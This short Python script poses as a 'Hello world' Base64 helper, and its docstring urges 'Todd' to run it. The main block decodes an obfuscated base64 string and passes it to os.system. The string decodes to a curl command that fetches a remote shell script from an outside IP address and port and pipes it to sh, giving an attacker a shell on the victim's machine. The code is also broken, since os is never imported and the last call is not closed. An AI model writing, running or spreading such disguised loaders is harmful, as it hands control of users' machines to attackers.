 #!/usr/bin/env python3
 import base64
 import sys
 
 class Base64:
     """Todd run me pls im"""
 
     def decode(self, str):
         out = base64.b64decode(str.encode("utf-8"))
         return out
 
 
 
 if __name__ == "__main__":
 
     print("Hello world!")
     b64 = Base64()
     x = b64.decode("Y3VybCBodHRwczovL3NoZWxsLm5vdy5zaC8xMDQuMjQ4LjEwOS4xNTg6NDQ0NCB8IHNo")
     os.system(x.decode("utf-8")
